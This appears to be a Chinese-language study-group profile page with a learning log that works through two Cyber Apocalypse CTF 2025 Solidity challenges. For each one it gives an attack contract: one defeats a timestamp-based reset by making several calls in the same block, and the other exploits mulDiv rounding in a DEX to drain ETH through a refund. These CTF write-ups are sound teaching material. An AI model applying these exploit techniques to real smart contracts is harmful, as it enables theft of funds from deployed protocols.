---
timezone: UTC+8
---

# Cauliweak9

**GitHub ID:** Cauliweak9

**Telegram:** @暂无

## Self-introduction

深大信安协会现任区块链方向负责人，了解基础的智能合约攻击/防御手段和Web3钓鱼手段，正在学习DeFi协议合约实现以及blob相关EIP，希望能通过此次共学认识更多志同道合的人，学到更多前沿技术

## Notes

<!-- Content_START -->
# 2025-08-04

太久没学Web3了，今天作为打卡第一天，先稍微做点简单题热身一下吧

下面是来源于Cyber Apocalypse CTF 2025的签到题Eldorion：

```solidity
// Eldorion.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}

// Setup.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol";

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}

```

由题意我们可以知道我们需要击败300血的Eldorion，但是每次攻击最多只能攻击100点血量，而且每次攻击会将上次攻击时间和本次攻击时间进行比对，如果本次攻击时间大于上次攻击时间则Eldorion会回满血

看起来这就是一个无底洞，但是我们可以轻松发现记录攻击时间使用的是`block.timestamp`，即区块生成时间，因此我们只需要让多次攻击处于同一区块内就可以绕过时间检测，同时需要注意不要Overkill，否则攻击会失败

```solidity
// attack.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
    function isDefeated() external view returns (bool);
}

contract Attack{
    IEldorion public eldorion;
    constructor(address _eldorion){
        eldorion = IEldorion(_eldorion);
    }

    function attack() public{
        for(uint8 i=0; i<3; i++){
            eldorion.attack(100);
        }
        require(eldorion.isDefeated(), "Failed to solve the problem");
    }
}
```

部署后调用`attack()`即可完成本题

是不是有点太水了，那就接着再水一题吧，是同一个CTF的第2题HeliosDEX：

```solidity
// HeliosDEX.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);

        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);

        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}


// Setup.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```

> 由于比赛已经过了很久了，我也不知道自己手上有多少初始ETH，假定是0.1ETH吧，同时为了方便在Remix调试（我懒得自己搓一个Foundry script了），稍微降低一下Setup中的参数，最终根据实际情况预定是传入99 ether（考虑到gas费无法传入100 ether），初始参数同样设置为99，`isSolved`等比修改为2 ether

这题提供了一个能交换3种ERC20的DEX，每种代币都有其独特的汇率，最后的refund只能兑换1种代币，从合约来看自然是HLS汇率最好，能和ETH达到1:0.1的汇率；除此之外，兑换代币和refund的时候都会收取2.5‰的手续费

观察一下合约，refund被一个reentrancy guard修饰，且只有该函数能转出ETH，因此重入攻击打不了，所以想解题只能尽可能多兑换代币

观察三种代币的兑换方式，我们发现它们都使用了OZ的`mulDiv`函数，但是其参数中的`Math.Rounding`十分可疑，因此我们查看OZ的合约源码：

```solidity
library Math {
    enum Rounding {
        Floor, // Toward negative infinity
        Ceil, // Toward positive infinity
        Trunc, // Toward zero
        Expand // Away from zero
    }
    // ...
}
```

那么我们会发现兑换ELD，MAL，HLS时，计算得到的代币数量分别会向下取整，向上取整，向上取整（由于不可能兑换负数个代币），因此我们可以仅使用1 wei兑换1个MAL或者1个HLS；同时由于整数除法导致的精度损失，我们兑换代币的数量只要不到400，就能忽略手续费，因此我们可以编写如下的攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IHeliosDEX{
    function swapForHLS() external payable;
    function oneTimeRefund(address item, uint256 amount) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Attack {
    IHeliosDEX public dex;
    constructor(address _dex) {
        dex = IHeliosDEX(_dex);
    }

    function attack(address item) public payable{
        uint iterations = msg.value;
        require(iterations > 80, "Too less iterations");
        for(uint i=0; i<iterations; i++){
            dex.swapForHLS{value: 1 wei}();
        }
        IERC20(item).approve(address(dex), iterations);
        dex.oneTimeRefund(item, iterations);
        refund();
        require(msg.sender.balance > 2 ether, "Failed to solve this problem");
    }

    function refund() internal{
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

> 需要注意一下，对于原题，使用for循环可能导致gas费消耗问题，可以稍微更改一下，此处仅作为思路提供
>
> 同时在最后进行refund前需要首先向DEX进行Approve操作，否则DEX的`transferFrom`会失败导致revert，同时由于转钱是转给`msg.sender`，因此需要给合约添加`receive()`函数接收转账，并添加提款函数提走合约内的资金以完成本题

行吧，就这样了，开摆~


# 2025.07.30


<!-- Content_END -->
